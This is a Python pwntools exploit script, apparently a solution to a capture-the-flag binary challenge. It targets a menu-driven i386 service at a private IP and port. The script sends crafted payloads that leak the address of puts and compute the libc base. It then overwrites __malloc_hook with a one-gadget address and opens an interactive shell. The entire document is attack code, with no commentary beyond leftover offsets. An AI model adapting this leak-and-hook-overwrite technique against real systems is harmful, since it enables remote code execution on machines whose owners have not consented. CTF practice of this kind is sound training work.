from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./pwn')
else:
	p = remote('172.16.9.41', 9003)
#gdb.attach(p)

printf = 0x804b014
puts = 0x804B028

payload = ''

#payload += '\x90\x90\x90\x90' + '\x90\x90\x90'
payload += '\x90' * 0
payload += p32(0x01800180) * 4 + p32(0x01d39090)
payload += p32(puts)	#0x80492E2
#payload += p32(0x90060300)
#payload += p32(0x00060301)
payload += p32(0x90900380)
payload += p32(0x90900110)
payload += p32(0x90900320)
payload += p32(0x90900110)
payload += p32(0x90900320)
payload += p32(0x90900110)
payload += p32(0x90900320)
payload += p32(0xB0900110)

def attack(payload):
	p.recvuntil('>>>')
	p.sendline('1')
	p.sendline(payload)
	p.recvuntil('>>>')
	p.sendline('2')

attack(payload)
puts_addr = u32(p.recvline()[1: 5])
print hex(puts_addr)
#libc_base = puts_addr - 0x5fca0
libc_base = puts_addr - 0x5f140
#malloc_hook = libc_base + 0x1b2768
malloc_hook = libc_base + 0x1b0768
onegadget = libc_base + 0x3a819

#0x80490BC
#0x080497BE
#0x804873E
#gdb.attach(p)
p.recvuntil('>>>')
p.sendline('3')

payload = ''
payload += p32(0x90080600)
payload += p32(0x01800180) * 2 + p32(0x01d39090)
payload += p32(malloc_hook)
payload += p32(0x90900380)
payload += p32(0x01800180) * 2 + p32(0x01d30180)
payload += p32(onegadget)
payload += p32(0x90900480)
payload += p32(0x90030a00)
payload += p32(0x01000302)
payload += p32(0xb0)
attack(payload)

p.interactive()
